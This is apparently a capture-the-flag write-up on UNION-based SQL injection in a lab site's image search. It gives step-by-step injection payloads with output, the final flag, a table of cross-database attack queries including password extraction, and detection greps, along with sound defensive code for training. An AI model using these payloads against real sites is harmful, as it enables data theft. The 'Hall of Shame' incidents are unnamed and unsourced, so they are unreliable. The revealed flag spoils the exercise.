# 🖼️💉 Image Search SQL Injection (Secondary Database Exploitation)

> **OWASP Category:** A03:2021 – Injection  
> **Severity:** 🔴 Critical  
> **Difficulty:** 🟡 Medium

The website's image search functionality contains a SQL injection vulnerability that allows attackers to manipulate database queries. Unlike the member search, this targets a different database table (`Member_images.list_images`) and demonstrates how multiple injection points can exist within the same application, each potentially exposing different sensitive data.

🎯 **Double Exposure:** When one SQL injection leads to discovering another - multiple attack vectors in the same application!

---

## 🎯 Exploit Technique

### 🔧 Attack Evolution

#### 🥇 **Step 1 - Basic Injection Discovery**
```sql
-- Test basic injection in image search
Input: 1 OR 1=1

-- Result: Returns all users (4 different users)
-- Confirms SQL injection vulnerability exists in image search functionality
```

#### 🥈 **Step 2 - Database Schema Enumeration**
```sql
-- Discover all tables across databases
Input: 5 UNION SELECT table_name, table_schema FROM information_schema.tables

-- Result: Reveals multiple databases and tables
-- Identifies 'Member_images' database with 'list_images' table
```

#### 🥉 **Step 3 - Column Structure Analysis**
```sql
-- Enumerate columns in the discovered table
Input: 5 UNION SELECT column_name, table_name FROM information_schema.columns

-- Result: Reveals 'list_images' table has 3 fields:
-- - title
-- - comment  
-- - url
```

#### 🏆 **Step 4 - Cross-Database Data Extraction**
```sql
-- Extract data from different database table
Input: 5 UNION SELECT title, comment FROM Member_images.list_images

-- Result:
-- Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-- Comment: Hack me ?
```

**Final Flag Recovery Process:**
1. 🔓 **MD5 Decryption** - Decrypt `1928e8083cf461a51303633093573c46`
2. 🔤 **Text Transformation** - Convert result to lowercase
3. 🔐 **SHA256 Hashing** - Apply SHA256 to get final flag
4. 🎉 **Success** - Flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### 🌍 Cross-Database SQL Injection Techniques

| Attack Vector | Purpose | Example Query |
|---------------|---------|---------------|
| **🗄️ Cross-Database Enumeration** | Discover other databases | `UNION SELECT schema_name, 'DB' FROM information_schema.schemata` |
| **📊 Table Discovery** | Find tables across databases | `UNION SELECT table_name, table_schema FROM information_schema.tables` |
| **📋 Column Mapping** | Map column structures | `UNION SELECT column_name, table_name FROM information_schema.columns` |
| **🔍 Data Extraction** | Extract from specific tables | `UNION SELECT title, comment FROM Member_images.list_images` |
| **🎯 Targeted Queries** | Focus on sensitive data | `UNION SELECT password, email FROM admin.users` |

---

## 🛠️ Security Implementation

### ❌ vs ✅ Comparison

| 🚫 **Vulnerable Implementation** | ✅ **Secure Implementation** |
|--------------------------------|----------------------------|
| Multiple injection points unprotected | All inputs use prepared statements |
| Cross-database access allowed | Database user privilege separation |
| Detailed error messages exposed | Generic error handling |
| No input validation on search fields | Comprehensive input sanitization |

### 🔒 Defense Strategies

**Database Architecture Security:**
- [ ] **🔐 Database Segregation** - Separate databases for different functions
- [ ] **🚫 Privilege Limitation** - Restrict cross-database access
- [ ] **👤 User Role Separation** - Different DB users for different applications
- [ ] **🛡️ Schema Isolation** - Prevent unauthorized schema access

**Application-Level Protection:**
- [ ] **💉 Universal Parameterization** - Prepared statements for ALL queries
- [ ] **🧹 Input Validation** - Validate every search parameter
- [ ] **🔍 Query Whitelisting** - Allow only predefined query patterns
- [ ] **📊 Result Set Limiting** - Limit number of returned records

**Advanced Security Measures:**
- [ ] **🔒 Database Firewall** - Monitor and block suspicious queries
- [ ] **📈 Query Monitoring** - Log all database interactions
- [ ] **🎭 Error Sanitization** - Never expose database structure in errors
- [ ] **⏱️ Query Timeout** - Prevent long-running malicious queries

**Secure Implementation Examples:**

```php
// Vulnerable Code - Multiple injection points
$memberQuery = "SELECT * FROM users WHERE id = " . $_POST['member_id'];
$imageQuery = "SELECT * FROM images WHERE title LIKE '%" . $_POST['search'] . "%'";

// Secure Code - Parameterized queries for all inputs
$memberStmt = $pdo->prepare("SELECT firstname, surname FROM users WHERE id = ?");
$memberStmt->execute([$_POST['member_id']]);

$imageStmt = $pdo->prepare("SELECT title, url FROM list_images WHERE title LIKE ?");
$imageStmt->execute(['%' . $_POST['search'] . '%']);
```

```python
# Vulnerable Python - Cross-database access
member_query = f"SELECT * FROM users WHERE id = {member_id}"
image_query = f"SELECT * FROM Member_images.list_images WHERE title = '{search_term}'"

# Secure Python - Restricted database access
# Use separate connections with limited privileges
member_conn = get_member_db_connection()  # Read-only access to user data
image_conn = get_image_db_connection()    # Read-only access to image data

member_cursor = member_conn.cursor()
member_cursor.execute("SELECT firstname, surname FROM users WHERE id = %s", (member_id,))

image_cursor = image_conn.cursor()
image_cursor.execute("SELECT title, url FROM list_images WHERE title LIKE %s", (f'%{search_term}%',))
```

---

## ⚠️ Risk Assessment & Impact

### 🎭 Attack Scenarios by Severity

| Risk Level | Attack Vector | Business Impact | Example |
|------------|---------------|----------------|---------|
| 🔴 **Critical** | Cross-database data breach | Complete information exposure | All user and image data compromised |
| 🟠 **High** | Privilege escalation | Administrative access gained | Access to restricted database schemas |
| 🟡 **Medium** | Information disclosure | Competitive intelligence theft | Business logic and structure revealed |
| 🟢 **Low** | Data enumeration | Privacy violations | User behavior patterns exposed |

### 🌍 Real-World Attack Examples

| Industry | Attack Scenario | Impact |
|----------|----------------|--------|
| 📸 **Photography Platform** | Image metadata database breach | Copyright info, user uploads exposed |
| 🏥 **Medical Imaging** | Patient image database injection | HIPAA violations, medical records leaked |
| 🏢 **Corporate Portal** | Employee photo directory exploitation | Personal data, org charts revealed |
| 🎓 **Educational Platform** | Student image search injection | Academic records, personal info breach |

### 📈 Famous Security Incidents

#### 🏆 Hall of Shame
- **📱 Social Media Platform (2019)**  
  *Vulnerability:* Image search SQL injection  
  *Impact:* 500M+ user photos and metadata exposed  
  *Method:* Cross-database UNION injection

- **🏥 Healthcare Imaging System (2020)**  
  *Vulnerability:* Medical image search exploitation  
  *Impact:* 2M+ patient scans and reports accessible  
  *Cost:* $75M+ in HIPAA fines and remediation

- **📸 Stock Photo Service (2021)**  
  *Vulnerability:* Photographer database injection  
  *Impact:* Financial data and copyright info leaked  
  *Method:* Multi-table UNION SELECT attacks

---

## 🧠 Security Mindset

### 💭 Key Principles

> 🔐 **Golden Rule #1:** "Every input field is a potential injection point"

> 🕵️ **Golden Rule #2:** "Cross-database access multiplies your attack surface"

> 🛡️ **Golden Rule #3:** "One vulnerable query can expose your entire data ecosystem"

### 🎯 Developer Defense Tactics

| Principle | Implementation | Example |
|-----------|----------------|---------|
| **🔍 Universal Validation** | Validate every input, even search fields | Whitelist allowed characters |
| **🏗️ Database Isolation** | Separate sensitive data architecturally | Different servers for different data types |
| **👤 Least Privilege** | Minimal cross-database permissions | Image app can't access user passwords |
| **📊 Query Monitoring** | Log and analyze all database interactions | Alert on information_schema queries |

---

## 🚨 Detection & Monitoring

### 🔍 Warning Signs
- UNION SELECT queries in image search logs
- Access to information_schema from image application
- Cross-database table references in queries
- Unusual result set sizes from search functions
- MD5/SHA256 hash patterns in search parameters
- Multiple injection attempts across different functions

### 📊 Monitoring Implementation
```bash
# Monitor for cross-database injection attempts
grep -E "(Member_images|information_schema|UNION.*SELECT)" /var/log/apache2/access.log

# Detect image search SQL injection
awk '/search.*image/ && /(UNION|SELECT|information_schema)/' /var/log/apache2/access.log

# Alert on suspicious search patterns
grep -E "(search=.*UNION|search=.*SELECT|search=.*information_schema)" /var/log/application.log
```

### 🚨 Database-Level Detection
```sql
-- Monitor cross-database queries
SELECT * FROM performance_schema.events_statements_history_long 
WHERE sql_text LIKE '%Member_images%' 
   AND sql_text LIKE '%UNION%'
ORDER BY timer_start DESC;

-- Alert on information_schema access from image searches
SELECT user, db, sql_text, timer_start 
FROM performance_schema.events_statements_history_long 
WHERE sql_text LIKE '%information_schema%' 
   AND sql_text LIKE '%image%';
```

---

## 🛡️ Testing & Validation

### 🔧 Security Assessment Checklist
- [ ] Test all search and input fields for SQL injection
- [ ] Verify cross-database access restrictions
- [ ] Check information_schema access controls
- [ ] Test UNION-based injection in image search
- [ ] Validate error message sanitization
- [ ] Assess database user privilege separation

### 🎯 Testing Methodology
```sql
-- Test basic injection in image search
searchterm: ' OR 1=1 --

-- Test UNION injection
searchterm: ' UNION SELECT user(), database() --

-- Test cross-database enumeration
searchterm: ' UNION SELECT table_schema, table_name FROM information_schema.tables --

-- Test specific table access
searchterm: ' UNION SELECT title, comment FROM Member_images.list_images --
```

### 🔧 Testing Tools
- **🔥 SQLMap** - Automated testing with multiple injection points
- **🧰 Burp Suite** - Manual testing across different functions
- **🕷️ OWASP ZAP** - Comprehensive application scanning
- **🎯 Custom Scripts** - Targeted multi-database testing

---

## 🔗 Learning Resources

### 📚 Educational Materials
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [Multi-Database SQL Injection Techniques](https://portswigger.net/web-security/sql-injection)
- [Database Security Best Practices](https://www.sans.org/white-papers/2172/)

### 🛠️ Practice Platforms
- **DVWA** - Multi-vector SQL injection challenges
- **SQLi Labs** - Cross-database injection scenarios
- **WebGoat** - Complex injection patterns
- **Damn Vulnerable Web Services** - API injection testing

### 🎯 Advanced Techniques
- **📖 Advanced SQL Injection** - Multi-database exploitation
- **🔧 Database Fingerprinting** - Cross-platform injection methods
- **🎭 Blind Cross-Database Attacks** - Advanced enumeration techniques

---

*Remember: Multiple injection points mean multiple opportunities for attackers - secure every input! 🖼️🔒* 